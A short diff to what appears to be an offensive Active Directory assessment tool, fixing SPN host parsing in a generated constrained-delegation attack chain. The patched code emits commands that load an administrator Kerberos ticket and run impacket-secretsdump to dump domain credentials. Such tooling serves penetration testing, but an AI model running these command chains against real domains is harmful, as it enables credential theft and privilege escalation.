@@ -649,6 +649,12 @@ def run(report, store, ui=None):
             _dom_c = store.dominant_domain() or "<dom>"
             # First target SPN for the sample command
             first_spn = spns[0] if spns else "cifs/<target>.<dom>"
+            # iter-49: SPN format is 'class/host[/port_or_path]' - grab the
+            # host portion (index 1). Previous split('/', 1)[-1] returned
+            # 'host/http' for 3-part SPNs, which impacket-secretsdump then
+            # tried to resolve as a hostname and failed.
+            _spn_parts = first_spn.split("/")
+            _spn_host = _spn_parts[1] if len(_spn_parts) >= 2 else first_spn
             chains.append(Chain("R-CONSTRAINED", "constrained delegation",
                 f"{ulc} has AllowedToDelegateTo {spns[:3]}"
                 f"{'...' if len(spns) > 3 else ''}",
@@ -659,7 +665,7 @@ def run(report, store, ui=None):
                     f"'{_dom_c}/{ulc}:{pw}'",
                     f"export KRB5CCNAME=administrator.ccache",
                     f"impacket-secretsdump -k -no-pass "
-                    f"'{_dom_c}/administrator@{first_spn.split('/', 1)[-1]}'",
+                    f"'{_dom_c}/administrator@{_spn_host}'",
                 ], src=best_src, line=best_line))
 
     # iter-45: R-ADMIN-CRED - the operator's owned plaintext cred matches
